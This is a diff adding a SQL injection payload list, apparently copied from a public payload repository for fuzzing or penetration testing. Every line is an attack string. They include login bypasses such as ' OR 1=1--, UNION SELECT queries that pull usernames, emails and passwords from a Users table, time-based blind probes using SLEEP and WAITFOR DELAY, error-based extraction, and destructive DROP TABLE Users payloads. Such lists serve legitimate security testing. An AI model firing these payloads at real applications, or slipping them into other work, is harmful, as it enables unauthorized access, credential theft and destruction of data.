@@ -1,0 +1,44 @@
+# Source: https://github.com/payloadbox/sql-injection-payload-list
+' OR 1=1--
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+') OR ('1'='1
+')) OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin' #
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--
+' UNION SELECT username,password FROM Users--
+1' ORDER BY 1--
+1' ORDER BY 10--
+' AND 1=1--
+' AND 1=2--
+' AND SLEEP(2)--
+' OR SLEEP(2)--
+'; WAITFOR DELAY '0:0:2'--
+' AND (SELECT COUNT(*) FROM Users)>0--
+' OR (SELECT COUNT(*) FROM Users)>0--
+1; DROP TABLE Users--
+'; DROP TABLE Users--
+' OR EXISTS(SELECT * FROM Users)--
+' HAVING 1=1--
+' GROUP BY email HAVING 1=1--
+' AND extractvalue(1,concat(0x7e,version()))--
+' OR 'a'='a
+' OR ''='
+"' OR "1"="1
+' OR '' = '
+%' OR '1'='1
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1 OFFSET 0--
+'='
+' or 1=1 or ''='
+1' AND '1'='1
+1' AND '1'='2
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
